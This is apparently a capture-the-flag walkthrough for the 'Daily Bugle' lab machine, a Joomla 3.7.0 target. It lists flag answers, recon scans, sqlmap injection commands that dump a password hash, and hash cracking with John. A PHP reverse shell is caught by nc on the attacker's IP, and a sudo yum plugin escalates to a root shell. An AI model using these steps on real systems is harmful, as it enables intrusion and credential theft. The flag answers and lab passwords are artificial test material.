# Daily Bugle
~~~
1 - Access the web server, who robbed the bank? Spiderman
2 - What is the Joomla version? 3.7.0
3 - What is Jonah's cracked password? spiderman123
4 - WHat is the user flag? 27a260fe3cba712cfdedb1c86d80442e
5 - What is the root flag? eec3d53292b1821868266858d7fa6f79
~~~

# Reconnaissance
~~~
Export IP=10.10.12.60
~~~

# Nmap 

~~~
└─$ sudo nmap -sV -sS 10.10.12.60    

Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-26 19:49 BST
Nmap scan report for 10.10.12.60
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http?
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.00 seconds
zsh: segmentation fault  sudo nmap -sV -sS 10.10.12.60

~~~

# Nikto 

~~~
└─$ nikto -h http://$IP                
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.12.60
+ Target Hostname:    10.10.12.60
+ Target Port:        80
+ Start Time:         2022-09-26 19:29:51 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.6.40
+ Retrieved x-powered-by header: PHP/5.6.40
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Entry '/administrator/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/bin/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cache/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/cli/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/components/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/includes/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/language/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/layouts/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/libraries/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/modules/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/plugins/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 14 entries which should be manually viewed.
+ PHP/5.6.40 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.                   
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-8193: /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval.
+ OSVDB-3092: /administrator/: This might be interesting...
+ OSVDB-3092: /bin/: This might be interesting...
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3092: /tmp/: This might be interesting...
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Operation now in progress
+ Scan terminated:  18 error(s) and 27 item(s) reported on remote host
+ End Time:           2022-09-26 19:38:40 (GMT1) (529 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
~~~
# Gobuster

~~~
─$ gobuster dir -u http://10.10.12.60/index.php/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.12.60/index.php/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/26 20:24:57 Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 9285]
/1                    (Status: 200) [Size: 9672]
/01                   (Status: 200) [Size: 9677]
/0                    (Status: 200) [Size: 9278]
/Home                 (Status: 200) [Size: 9285]
/1x1                  (Status: 200) [Size: 9678]
~~~

# Joomscan

~~~
joomscan -u http://10.10.12.60


    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.12.60 ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing :                  
http://10.10.12.60/administrator/components             
http://10.10.12.60/administrator/modules                
http://10.10.12.60/administrator/templates              
http://10.10.12.60/images/banners                       
                                                        
                                                        
[+] Checking apache info/status files                   
[++] Readable info/status files are not found           
                                                        
[+] admin finder                                        
[++] Admin page : http://10.10.12.60/administrator/     
                                                        
[+] Checking robots.txt existing                        
[++] robots.txt is found                                
path : http://10.10.12.60/robots.txt                    
                                                        
Interesting path found from robots.txt                  
http://10.10.12.60/joomla/administrator/                
http://10.10.12.60/administrator/                       
http://10.10.12.60/bin/                                 
http://10.10.12.60/cache/                               
http://10.10.12.60/cli/                                 
http://10.10.12.60/components/                          
http://10.10.12.60/includes/                            
http://10.10.12.60/installation/                        
http://10.10.12.60/language/                            
http://10.10.12.60/layouts/                             
http://10.10.12.60/libraries/                           
http://10.10.12.60/logs/                                
http://10.10.12.60/modules/                             
http://10.10.12.60/plugins/                             
http://10.10.12.60/tmp/                                 
                                                        
                                                        
[+] Finding common backup files name                    
[++] Backup files are not found                         
                                                        
[+] Finding common log files name                       
[++] error log is not found                             
                                                        
[+] Checking sensitive config.php.x file                
[++] Readable config files are not found                
                                                        
                                                        
Your Report : reports/10.10.12.60/   
~~~
# Website

~~~
http://10.10.12.60/index.php/

http://10.10.12.60/administrator/
jonah / spiderman123

Template/Options enable PHP

add PHP reverse to index.php (preview to run)

 sudo nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.18.91.23] from (UNKNOWN) [10.10.188.218] 59018
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 18:09:02 up 34 min,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ cd home

jjameson (Username)

cd /var/www/html

cat configuration.txt
Password found nv5uz9r3ZEDzVjNu
secret found UAMBRWzHO3oFPmVC
~~~

# SSH

~~~
sudo ssh jjameson@10.10.188.218
password : nv5uz9r3ZEDzVjNu

Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
27a260fe3cba712cfdedb1c86d80442e
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum

    Use GTFOBINS search yum

https://gtfobins.github.io/gtfobins/yum/#sudo

[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# 






~~~


# Linpeas

~~~
nc -lnvp 1234 > linpeas.sh (from target)

nc -w 3 10.10.30.43 1234 < linpeas.sh (from attacker)

chmod +x linpeas.sh
./linpeas.sh

(didnt work for me)
~~~

# /Robots.txt

~~~
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
~~~

# Enumeration

~~~
└─$ searchsploit joomla 3.7.0              
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                        | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                     | php/webapps/43488.txt
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

sudo searchsploit -m php/webapps/42033.txt
~~~

# SQLMap

~~~
sudo sqlmap -u "http://10.10.12.60/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

web server operating system: Linux CentOS 7
web application technology: Apache 2.4.6, PHP 5.6.40
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[21:15:19] [INFO] fetching database names
[21:15:19] [INFO] retrieved: 'information_schema'
[21:15:19] [INFO] retrieved: 'joomla'
[21:15:19] [INFO] retrieved: 'mysql'
[21:15:20] [INFO] retrieved: 'performance_schema'
[21:15:20] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

sqlmap -u "http://10.10.12.60/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -C username -D joomla -T "#__users" --dump

[22:13:14] [INFO] fetching entries of column(s) 'username' for table '#__users' in database 'joomla'
[22:13:14] [INFO] resumed: 'jonah'
Database: joomla
Table: #__users
[1 entry]
+----------+
| username |
+----------+
| jonah    |
+----------+

 sqlmap -u "http://10.10.12.60/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -C password -D joomla -T "#__users" --dump

database: joomla
Table: #__users
[1 entry]
+--------------------------------------------------------------+
| password                                                     |
+--------------------------------------------------------------+
| $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm |
+--------------------------------------------------------------+
~~~

# John the Ripper

~~~
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:40 0.09% (ETA: 10:41:27) 0g/s 386.4p/s 386.4c/s 386.4C/s 020292..emmajane
spiderman123     (?)     
1g 0:00:02:07 DONE (2022-09-26 22:22) 0.007844g/s 367.6p/s 367.6c/s 367.6C/s thelma1..setsuna
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
~~~